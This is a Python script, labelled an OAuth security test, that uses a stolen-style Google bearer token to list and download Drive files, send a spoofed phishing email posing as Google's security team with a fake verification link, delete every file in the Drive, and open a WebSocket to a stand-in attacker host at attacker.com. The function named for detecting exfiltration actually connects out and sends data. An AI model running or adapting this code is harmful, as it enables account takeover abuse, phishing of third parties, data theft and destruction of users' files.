import requests
import json
import websocket
import logging

# ‚ö†Ô∏è Use a TEST OAuth token for research purposes only
OAUTH_TOKEN = "ya29.a0AfH6SMBEXAMPLETOKEN"
WEBSOCKET_URL = "wss://attacker.com/socket"  # Simulated WebSocket Exfiltration

# ‚úÖ Configure Logging
logging.basicConfig(filename="security_logs.txt", level=logging.INFO, format="%(asctime)s - %(message)s")

# ‚úÖ Function to Log Activity
def log_activity(activity):
    print("[LOG]", activity)
    logging.info(activity)

# ‚úÖ 1. List Google Drive Files
def list_drive_files():
    url = "https://www.googleapis.com/drive/v3/files"
    headers = {"Authorization": f"Bearer {OAUTH_TOKEN}"}

    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        data = response.json()
        log_activity(f"Listed Google Drive Files: {json.dumps(data, indent=2)}")
    else:
        log_activity(f"Failed to list files: {response.text}")

# ‚úÖ 2. Download a File from Google Drive
def download_file(file_id):
    url = f"https://www.googleapis.com/drive/v3/files/{file_id}?alt=media"
    headers = {"Authorization": f"Bearer {OAUTH_TOKEN}"}

    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        log_activity(f"Downloaded File (ID: {file_id}): {response.text[:100]}...")  # Log first 100 chars
    else:
        log_activity(f"Failed to download file: {response.text}")

# ‚úÖ 3. Send Email via Gmail (Phishing Simulation)
def send_phishing_email():
    url = "https://www.googleapis.com/gmail/v1/users/me/messages/send"
    headers = {"Authorization": f"Bearer {OAUTH_TOKEN}", "Content-Type": "message/rfc822"}
    
    email_data = """
    From: "Security Team" <security@google.com>
    To: victim@example.com
    Subject: Urgent: Suspicious Login Detected
    
    Click below to verify your account:
    https://fake-security.com
    """
    
    response = requests.post(url, headers=headers, data=email_data)
    if response.status_code == 200:
        log_activity("Simulated Email Sent via OAuth Token")
    else:
        log_activity(f"Failed to send email: {response.text}")

# ‚úÖ 4. Delete All Files from Google Drive
def delete_all_files():
    url = "https://www.googleapis.com/drive/v3/files"
    headers = {"Authorization": f"Bearer {OAUTH_TOKEN}"}

    response = requests.get(url, headers=headers)
    if response.status_code == 200:
        files = response.json().get("files", [])
        for file in files:
            delete_url = f"https://www.googleapis.com/drive/v3/files/{file['id']}"
            requests.delete(delete_url, headers=headers)
            log_activity(f"Deleted File: {file['name']}")
    else:
        log_activity(f"Failed to list files for deletion: {response.text}")

# ‚úÖ 5. Detect Unauthorized WebSocket Connections
def detect_websocket_exfiltration():
    def on_open(ws):
        log_activity(f"Detected WebSocket Connection to: {WEBSOCKET_URL}")
        ws.send("Test Message")

    def on_error(ws, error):
        log_activity(f"WebSocket Error Detected: {error}")

    ws = websocket.WebSocketApp(WEBSOCKET_URL, on_open=on_open, on_error=on_error)
    ws.run_forever()

# üöÄ Run All Security Tests
if __name__ == "__main__":
    print("üîπ Running OAuth Security Test...")
    list_drive_files()
    # download_file("EXAMPLE_FILE_ID")  # Uncomment to test downloading files
    # send_phishing_email()  # Uncomment to simulate email abuse
    # delete_all_files()  # Uncomment to test unauthorized deletion
    detect_websocket_exfiltration()
